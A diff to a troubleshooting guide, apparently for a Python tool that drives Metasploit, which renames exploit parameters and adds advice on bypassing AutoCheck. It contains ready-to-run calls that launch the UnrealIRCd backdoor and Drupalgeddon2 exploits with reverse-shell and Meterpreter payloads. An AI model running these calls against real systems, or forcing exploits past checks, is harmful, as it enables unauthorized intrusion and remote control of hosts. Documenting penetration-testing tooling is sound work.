@@ -165,22 +165,22 @@ Move payload-specific options to `payload_options`:
 ```python
 # ❌ WRONG
 await run_exploit(
-    module_name='exploit/unix/irc/unreal_ircd_3281_backdoor',
+    module='exploit/unix/irc/unreal_ircd_3281_backdoor',
     options={
         'RHOSTS': '10.0.2.15',
         'LHOST': '10.0.0.1',  # ❌ Wrong location
         'LPORT': 4444         # ❌ Wrong location
     },
-    payload_name='cmd/unix/reverse'
+    payload='cmd/unix/reverse'
 )
 
 # ✅ CORRECT
 await run_exploit(
-    module_name='exploit/unix/irc/unreal_ircd_3281_backdoor',
+    module='exploit/unix/irc/unreal_ircd_3281_backdoor',
     options={
         'RHOSTS': '10.0.2.15'
     },
-    payload_name='cmd/unix/reverse',
+    payload='cmd/unix/reverse',
     payload_options={
         'LHOST': '10.0.0.1',  # ✅ Correct location
         'LPORT': 4444         # ✅ Correct location
@@ -228,6 +228,7 @@ Cannot start listener: Port 4444 is already in use on 0.0.0.0
 2. **Firewall:** Blocking reverse connections
 3. **Wrong LHOST:** Not reachable from target
 4. **Service not vulnerable:** Target may be patched
+5. **AutoCheck aborted the exploit:** Metasploit stopped due to an inconclusive check
 
 **Debugging Steps:**
 
@@ -248,6 +249,17 @@ Cannot start listener: Port 4444 is already in use on 0.0.0.0
 3. **Verify services on target:**
    ```bash
    nmap -sV -p TARGET_PORTS TARGET_IP
+   ```
+
+4. **Bypass AutoCheck when appropriate:**
+   ```python
+   await run_exploit(
+       module="exploit/unix/webapp/drupal_drupalgeddon2",
+       options={"RHOSTS": "192.168.1.50", "TARGETURI": "/"},
+       payload="php/meterpreter/reverse_tcp",
+       payload_options={"LHOST": "192.168.1.10", "LPORT": 4444},
+       force_exploit=True,
+   )
    ```
 
 ## Listener Issues
